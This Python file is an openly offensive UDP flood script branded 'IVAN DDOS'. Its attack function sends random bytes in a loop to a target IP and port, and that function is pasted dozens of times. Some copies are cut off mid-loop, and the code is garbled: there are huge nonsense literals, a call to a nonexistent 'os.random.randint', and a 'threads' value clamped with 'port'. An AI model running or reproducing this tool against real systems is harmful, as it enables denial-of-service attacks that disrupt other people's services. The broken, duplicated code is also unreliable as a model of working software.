def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

